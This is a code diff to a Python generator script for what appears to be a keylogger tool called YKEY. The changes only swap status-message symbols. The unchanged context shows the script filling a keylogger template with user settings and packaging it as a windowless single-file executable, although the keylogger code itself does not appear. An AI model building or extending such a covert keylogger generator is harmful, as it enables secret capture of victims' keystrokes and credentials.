@@ -68,9 +68,9 @@ def generate_keylogger(inputs_dict):
         global devnull
         check_output('mkdir sources', shell=True, stderr=devnull)
         print(colors.Yellow + '[!]Sources folder did not found' + colors.RESET)
-        print(colors.Green + '[+]Sources folder created' + colors.RESET)
+        print(colors.Green + '[✓]Sources folder created' + colors.RESET)
     except CalledProcessError:
-        print(colors.Green + '[+]Sources Folder found already created' + colors.RESET)
+        print(colors.Green + '[✓]Sources Folder found already created' + colors.RESET)
 
     # activating virtual environment
     print(colors.Yellow + '[!]Trying to access the virtual environment for the program' + colors.RESET)
@@ -78,12 +78,12 @@ def generate_keylogger(inputs_dict):
     try:
         venv_file_path = program_path + '/venv/bin/activate_this.py'
         execfile_y(venv_file_path, dict(__file__=venv_file_path))
-        print(colors.Green + '[+]Virtual Environment Activated!!')
+        print(colors.Green + '[✓]Virtual Environment Activated!!')
 
 
         with open(program_path + '/libs/keylogger/main_key_logger.py' , 'r') as logger_base_source:
             content = logger_base_source.read()
-        print(colors.Green + '[+]Base File read successful')
+        print(colors.Green + '[✓]Base File read successful')
 
         content = content.replace("'**p_id**'", inputs_dict['PID'])
         content = content.replace("'**sleep**'", inputs_dict['SLEEP'])
@@ -95,16 +95,16 @@ def generate_keylogger(inputs_dict):
 
         with open(program_path + '/sources/{}.py'.format(inputs_dict['PNAME']), 'w') as output_logger:
             output_logger.write(content)
-        print(colors.Green + '[+]Source File writing successful')
+        print(colors.Green + '[✓]Source File writing successful')
 
         with open(program_path + '/{}.py'.format(inputs_dict['PNAME']), 'w') as output_logger:
             output_logger.write(content)
-        print(colors.Green + '[+]Source File coppied to working directory')
+        print(colors.Green + '[✓]Source File coppied to working directory')
 
         print(colors.Yellow + '[!]Creating Executables.. this may take some time....')
         check_output('pyinstaller {}.py --onefile --noconsole'.format(inputs_dict['PNAME']), shell=True, stderr=devnull)
-        print(colors.Green + '[+]Executables created success fully')
-        print(colors.Green + '[+]Your files have been saved to {}Dist{} {}dirrectory'.format(colors.BOLD, colors.RESET, colors.Green))
+        print(colors.Green + '[✓]Executables created success fully')
+        print(colors.Green + '[✓]Your files have been saved to {}Dist{} {}dirrectory'.format(colors.BOLD, colors.RESET, colors.Green))
 
         print(colors.Yellow + '[!]Removing temp files......')
         name = program_path + '/' + inputs_dict['PNAME']
@@ -112,11 +112,11 @@ def generate_keylogger(inputs_dict):
         check_output("rm '{}'.spec".format(name), shell=True)
         check_output("rm -R '{}/'build".format(program_path), shell=True)
         check_output("rm -R '{}/'__pycache__".format(program_path), shell=True)
-        print(colors.Green + '[+]Generation successful\n' + colors.RESET)
+        print(colors.Green + '[✓]Generation successful\n' + colors.RESET)
 
     except Exception as error:
-        print(colors.Red + '[-]Erroro occured while activating the virtual environment')
-        print(colors.Red + '[-]Error --> ' + error)
+        print(colors.Red + '[✘]Erroro occured while activating the virtual environment')
+        print(colors.Red + '[✘]Error --> ' + error)
         print(colors.Yellow + 'Please re install the YKEY program to get rid of this error')
         exit(0)
 
@@ -178,7 +178,7 @@ def activate_generation(program_path):
 
         # if the command is non of above it is a unreconised command
         else:
-            print(colors.Red + '[-]Invalid command' + colors.RESET)
+            print(colors.Red + '[✘]Invalid command' + colors.RESET)
 
 
 activate_generation(program_path)
